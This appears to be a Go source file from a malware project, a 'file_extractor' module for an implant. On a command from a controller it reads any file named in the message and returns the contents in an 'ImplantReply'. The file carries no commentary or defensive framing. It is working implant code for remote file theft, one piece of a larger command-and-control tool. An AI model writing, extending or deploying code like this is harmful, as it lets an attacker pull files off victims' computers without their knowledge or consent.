package file_extractor

import (
	"io/ioutil"
	"malware/common/messages"
	"malware/common/types"
)

type state struct {
	running bool
}

type settings struct {
	state *state // Tell our loop to stop
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{running: false}
	return settings{&state}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
	file := message.GetGetfile()
	if file == nil {
		return false
	}

	out, err := ioutil.ReadFile(file.Filename)
	if err != nil {
		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_FILE_NOT_FOUND})
	} else {
		callback(&messages.ImplantReply{Module: settings.ID(), Args: out})
	}
	return true
}

// Init the state of this module
func (settings settings) Init() {
	settings.state.running = true
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "file_extractor" }
